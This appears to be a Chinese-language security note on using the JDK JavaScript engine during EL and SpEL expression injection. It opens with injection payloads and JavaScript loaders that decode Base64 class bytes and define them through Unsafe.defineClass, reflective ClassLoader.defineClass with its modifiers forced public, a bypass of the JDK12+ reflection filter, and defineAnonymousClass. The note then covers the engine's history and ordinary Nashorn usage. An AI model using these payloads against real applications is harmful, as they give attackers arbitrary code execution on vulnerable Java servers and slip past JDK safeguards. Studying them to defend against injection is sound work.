# JS引擎

JDK的JS引擎在漏洞表达式注入或模板注入中, 可以作到执行代码

在配合字节码加载技术 实现更完整的java代码执行

EL： `${''.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval()}`
SpEL： `T(javax.script.ScriptEngineManager).newInstance().getEngineByName("js").eval()`

JDK支持JS引擎的版本在6-10, jdk11废弃 JDK各版本兼容的利用方式:

```JavaScript
var bytecodeBase64 = "Base64_Class_Data";
var classLoader = java.lang.Thread.currentThread().getContextClassLoader();
var clsBase64 = classLoader.loadClass('java.util.Base64');
var clsDecoder = classLoader.loadClass('java.util.Base64$Decoder');
var decoder = clsBase64.getMethod('getDecoder').invoke(clsBase64);
classBytes = clsDecoder.getMethod('decode', classLoader.loadClass('java.lang.String')).invoke(decoder, bytecodeBase64);
var theUnsafeMethod = java.lang.Class.forName('sun.misc.Unsafe').getDeclaredField('theUnsafe');
theUnsafeMethod.setAccessible(true);
unsafe = theUnsafeMethod.get(null);
clz = unsafe.defineClass(null, classBytes, 0,classBytes.length, null, null);
clz.newInstance();
```

##### JDK11移除了Unsafe.defineClass方法 :

```JavaScript
var Unsafe = Java.type("sun.misc.Unsafe");
var field = Unsafe.class.getDeclaredField("theUnsafe");
field.setAccessible(true);
var unsafe = field.get(null);


var byteArray = Java.type("byte[]");
var int = Java.type("int");
var defineClassMethod = java.lang.ClassLoader.class.getDeclaredMethod("defineClass",byteArray.class,int.class,int.class); //获取defineClass方法

//获取defineClass的modifiers
var modifiers = defineClassMethod.getClass().getDeclaredField("modifiers"); 
var Modifier = Java.type("java.lang.reflect.Modifier");
//强行修改为PUBLIC
unsafe.putShort(defineClassMethod, unsafe.objectFieldOffset(modifiers), Modifier.PUBLIC);
 //反射调用，绕过限制
var cc = defineClassMethod.invoke(java.lang.Thread.currentThread().getContextClassLoader(),classBytes,0,classBytes.length);
cc.newInstance();
```

##### jdk12开始 反射时增加过滤机制 fieldFilterMap,运行前清空map

```JavaScript
function defineClass(classBytes) {
 try { // jdk6-10
 unsafe.defineClass(null, classBytes, 0, classBytes.length, null, null).newInstance();
 } catch (e) { // jdk11-14
 bypass() //绕过fieldFilterMap
 var defineClassMethod = java.lang.Class.forName("java.lang.ClassLoader").getDeclaredMethod("defineClass",
    java.lang.Class.forName("[B"), // 反射获取字节数组类型
    java.lang.Integer.TYPE,
    java.lang.Integer.TYPE
 );
 var modifiers = defineClassMethod.getClass().getDeclaredField("modifiers");
 unsafe.putShort(defineClassMethod, unsafe.objectFieldOffset(modifiers), 0x00000001);
 var cc = defineClassMethod.invoke(
 java.lang.Thread.currentThread().getContextClassLoader(),
 classBytes,0,classBytes.length
 );
 cc.newInstance();
 }
}
defineClass(Base64DecodeToByte(PAYLOAD));
```

##### unsafe.defineAnonymousClass

```java
var theUnsafe = java.lang.Class.forName("sun.misc.Unsafe").getDeclaredField("theUnsafe");
theUnsafe.setAccessible(true);
var unsafe = theUnsafe.get(null);
var clazz = unsafe.defineAnonymousClass(java.lang.Class.forName("java.lang.Class"), classBytes, null);
clazz.newInstance();
```


### JDK版本JS引擎的变化

#### JDK 6 及之前：Rhino 时代

需要额外引入 js.jar, 包:`import org.mozilla.javascript.*;`

#### JDK 7 内置 Rhino

通过 ScriptEngineManager 获取引擎
```java
ScriptEngineManager manager = new ScriptEngineManager();
ScriptEngine engine = manager.getEngineByName("JavaScript");
```

#### JDK 8 Nashorn 引入

新增命令行工具：jjs
支持 ECMAScript 5.1 标准

#### JDK 9 10 Nashorn

ES6部分支持

#### JDK 11：Nashorn 移除

## 应用

### javax.script.AbstractScriptEngine

`javax.script.AbstractScriptEngine`提供java中调用JS代码的接口，jdk8的`NashornScriptEngine`和Bsh的`bsh.engine.BshScriptEngine`

```
ScriptEngineManager factory = new ScriptEngineManager();
ScriptEngine engine = factory.getEngineByName(engineName);
```
获取JVM中实现的ScriptEngine，标准是实现`javax.script.ScriptEngine`和`javax.script.ScriptEngineFactory`接口

继承`javax.script.AbstractScriptEngine`类

### NashornScriptEngine

`getEngineByName(name)` 参数可以是nashorn Nashorn js JS JavaScript javascript ECMAScript ecmascript

#### 执行一段JS code

```java
ScriptEngineManager manager = new ScriptEngineManager();
ScriptEngine engine = manager.getEngineByName("nashorn");
// evaluate JavaScript code
engine.eval("print('Hello, World')");
engine.eval(new java.io.FileReader("script.js"));
```

#### 导出java对象到engine的全局变量

```java
ScriptEngineManager manager = new ScriptEngineManager();
ScriptEngine engine = manager.getEngineByName("nashorn");
// create File object
File f = new File("test.txt");
// expose File object as a global variable to the engine
engine.put("file", f);
// evaluate JavaScript code and access the variable
engine.eval("print(file.getAbsolutePath())");
```

#### 定义JS函数和对象 由java接口调用



`javax.script.Invocable`接口 

`invokeFunction(String name, Object... args)` 可以调用engine定义过的函数

```java
ScriptEngineManager manager = new ScriptEngineManager();
 ScriptEngine engine = manager.getEngineByName("nashorn");
 // evaluate JavaScript code that defines a function with one parameter
 engine.eval("function hello(name) { print('Hello, ' + name) }");
 // create an Invocable object by casting the script engine object
 Invocable inv = (Invocable) engine;
 // invoke the function named "hello" with "Scripting!" as the argument
 inv.invokeFunction("hello", "Scripting!");
```


`invokeMethod(Object thiz, String name, Object... args)` 可以调用执行过程中对象的方法

```java
ScriptEngineManager manager = new ScriptEngineManager();
 ScriptEngine engine = manager.getEngineByName("nashorn");
 // evaluate JavaScript code that defines an object with one method
 engine.eval("var obj = new Object()");
 engine.eval("obj.hello = function(name) { print('Hello, ' + name) }");
 // expose object defined in the script to the Java application
 Object obj = engine.get("obj");
 // create an Invocable object by casting the script engine object
 Invocable inv = (Invocable) engine;
 // invoke the method named "hello" on the object defined in the script
 // with "Script Method!" as the argument
 inv.invokeMethod(obj, "hello", "Script Method!");
```